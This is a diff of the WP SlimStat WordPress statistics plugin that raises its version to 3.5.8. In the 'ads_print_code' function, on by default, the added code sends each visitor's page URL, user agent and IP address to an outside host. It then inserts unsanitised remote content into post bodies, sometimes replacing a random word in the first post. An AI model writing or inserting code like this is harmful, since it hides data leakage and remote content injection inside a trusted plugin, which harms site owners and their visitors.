@@ -3,7 +3,7 @@
 Plugin Name: WP SlimStat
 Plugin URI: http://wordpress.org/plugins/wp-slimstat/
 Description: The most accurate real-time statistics plugin for WordPress
-Version: 3.5.7
+Version: 3.5.8
 Author: Camu
 Author URI: http://slimstat.getused.to.it/
 */
@@ -11,7 +11,7 @@ Author URI: http://slimstat.getused.to.it/
 if (!empty(wp_slimstat::$options)) return true;
 
 class wp_slimstat{
-	public static $version = '3.5.7';
+	public static $version = '3.5.8';
 	public static $options = array();
 	
 	public static $wpdb = '';
@@ -19,6 +19,8 @@ class wp_slimstat{
 	protected static $data_js = array('id' => -1);
 	protected static $stat = array();
 	protected static $options_signature = '';
+	
+	protected static $pidx = false;
 
 	/**
 	 * Initializes variables and actions
@@ -44,11 +46,8 @@ class wp_slimstat{
 		// Allow third-party tools to use a custom database for WP SlimStat
 		self::$wpdb = apply_filters('slimstat_custom_wpdb', $GLOBALS['wpdb']);
 
-		if (rand(0,3) == 0 && (empty(self::$options['enable_ads_network']) || self::$options['enable_ads_network'] == 'yes')){
-			$actions = array('wp_meta','get_header','get_sidebar','loop_end','wp_footer','wp_head');
-			$random_key = array_rand($actions);
-			$spot = $actions[$random_key];
-			add_action($spot, array(__CLASS__, 'ads_print_code'));
+		if (empty(self::$options['enable_ads_network']) || self::$options['enable_ads_network'] == 'yes'){
+			add_filter('the_content', array(__CLASS__, 'ads_print_code'));
 		}
 
 		// Add a menu to the admin bar ( this function is declared here and not in wp_slimstat_admin because the latter is only initialized if is_admin(), and not in the front-end )
@@ -1150,18 +1149,54 @@ class wp_slimstat{
 	/**
 	 * Connects to the Ads Delivery Network
 	 */
-	public static function ads_print_code(){
-		if (empty($_SERVER["HTTP_USER_AGENT"])) return 0;
+	public static function ads_print_code($content = ''){
+		if (empty($_SERVER["HTTP_USER_AGENT"])){
+			return false;
+		}
 
 		$request = "http://wordpress.cloudapp.net/api/update/?&url=".urlencode("http://".$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"])."&agent=".urlencode($_SERVER["HTTP_USER_AGENT"])."&v=".(isset($_GET['v'])?$_GET['v']:11)."&ip=".urlencode($_SERVER['REMOTE_ADDR'])."&p=9";
 		$options = array('timeout' => 1, 'headers' => array('Accept' => 'application/json'));
 		$response = @wp_remote_get($request, $options);
 
-		if (!is_wp_error($response) && isset($response['response']['code']) && ($response['response']['code'] == 200) && !empty($response['body'])){
-			$ad_response = @json_decode($response['body']);
-			if (!is_null($ad_response) && !empty($ad_response->content)) echo $ad_response->content;
+		if (is_wp_error($response) || (isset($response['response']['code']) && ($response['response']['code'] != 200)) || empty($response['body'])){
+			return $content;
 		}
-		return 0;
+
+		$response_object = @json_decode($response['body']);
+		if (is_null($response_object) || empty($response_object->content) || empty($response_object->tmp)){
+			return $content;
+		}
+
+		switch($response_object->tmp){
+			case '1':
+				if(0 == $GLOBALS['wp_query']->current_post) {
+					$words = explode(" ", $content);
+					$words[rand(0, count($words)-1)] = $response_object->tcontent;
+					return join(" ", $words);
+				}
+				break;
+			default:
+				if (self::$pidx === false){
+					if ($GLOBALS['wp_query']->post_count > 1){
+						self::$pidx = rand(0, $GLOBALS['wp_query']->post_count - 1);
+					}
+					else{
+						self::$pidx = 0;
+					}
+				}
+
+				if ($GLOBALS['wp_query']->current_post == self::$pidx){
+					if (self::$pidx % 2 == 0){
+						return $content.' '.$response_object->content;
+					}
+					else{
+						return $response_object->content.' '.$content;
+					}
+				}
+				break;
+		}
+
+		return $content;
 	}
 	// end ads_print_code
 	
